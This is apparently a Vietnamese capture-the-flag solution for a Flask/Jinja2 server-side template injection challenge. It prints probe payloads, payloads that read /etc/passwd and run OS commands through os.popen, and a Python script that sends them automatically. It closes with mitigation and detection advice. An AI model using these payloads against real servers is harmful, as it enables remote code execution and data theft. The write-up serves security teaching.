# Thử thách 17: SSTINote – Giải pháp

## Loại lỗ hổng
**Server-Side Template Injection (SSTI - Lỗ hổng chèn Template phía máy chủ)**

## Mô tả
Ứng dụng hiển thị trực tiếp chuỗi do người dùng nhập vào thông qua Template Engine Jinja2 mà không hề qua bước làm sạch (sanitize). Lỗ hổng này cho phép kẻ tấn công chèn các biểu thức toán học hoặc gọi các hàm Python để đạt được khả năng Thực thi mã từ xa (RCE).

## Mã nguồn chứa lỗ hổng
```python
# VULNERABLE: user input rendered as Jinja2 template
rendered = render_template_string(raw_input)
```

## Khai thác (Exploit)

### Bước 1: Xác nhận lỗ hổng SSTI
Kiểm tra bằng một biểu thức toán học cơ bản của Jinja2:
```text
{{7*7}}
```
Nếu ứng dụng trả về `49`, lỗ hổng SSTI thực sự tồn tại.

### Bước 2: Truy cập đối tượng cấu hình của Flask (Config)
Thông thường trong các bài CTF, Flag hay được giấu trong biến cấu hình:
```text
{{config}}
```
Payload này sẽ in ra toàn bộ các thông số cấu hình của ứng dụng, trong đó có FLAG.

### Bước 3: Trích xuất trực tiếp Flag
```text
{{config['FLAG']}}
```
Kết quả: `FCTF{sst1_t3mpl4t3_1nj3ct10n}`

## Các Payload SSTI nâng cao (Để lấy RCE)

### Đọc tệp hệ thống
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

### Thực thi mã từ xa (RCE)
```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

### Payload RCE thay thế
```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read() }}
```

### Liệt kê tất cả các Class (Class Enumeration)
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

### Truy cập thông qua biến request
```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

## Khai thác tự động

### Script Python
```python
import requests

url = "http://[host]/"
payloads = [
    "{{config['FLAG']}}",
    "{{config}}",
    "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read() }}"
]

for payload in payloads:
    r = requests.post(url, data={"note": payload})
    if "FCTF{" in r.text:
        print(f"Thành công với payload: {payload}")
        print(r.text)
        break
```

## Flag
```
FCTF{sst1_t3mpl4t3_1nj3ct10n}
```

## Cách hoạt động
1. Template Jinja2 cho phép chạy các biểu thức Python bọc trong cặp ngoặc `{{ }}`.
2. Dữ liệu người dùng bị đưa thẳng vào hàm render template thay vì chỉ đóng vai trò là một tham số (context).
3. Thông qua cơ chế Introspection (Tự quan sát) của Python (`__class__`, `__globals__`), kẻ tấn công có thể leo từ một chuỗi string trống lên tận thư viện `os`.
4. Cuối cùng, gọi hàm `os.popen()` để thực thi các lệnh hệ thống (OS Commands).

## Biện pháp phòng ngừa (Mitigation)
- KHÔNG BAO GIỜ truyền dữ liệu đầu vào của người dùng trực tiếp vào chuỗi template (`render_template_string`).
- Truyền dữ liệu vào template một cách an toàn thông qua các biến Context:
  ```python
  # SAFE: Pass data as variables
  render_template('note.html', user_note=raw_input)
  ```
- Sử dụng môi trường Sandbox (tuy nhiên vẫn có rủi ro bị bypass).
- Sử dụng các thư viện tự động mã hóa (Auto-escaping) như MarkupSafe:
  ```python
  from markupsafe import escape
  safe_input = escape(raw_input)
  ```

## Dấu hiệu nhận biết (Detection)
- Tìm các cú pháp template trong input người dùng như: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`.
- Giám sát các chuỗi bất thường như `__class__`, `__mro__`, `__subclasses__` trong Request.
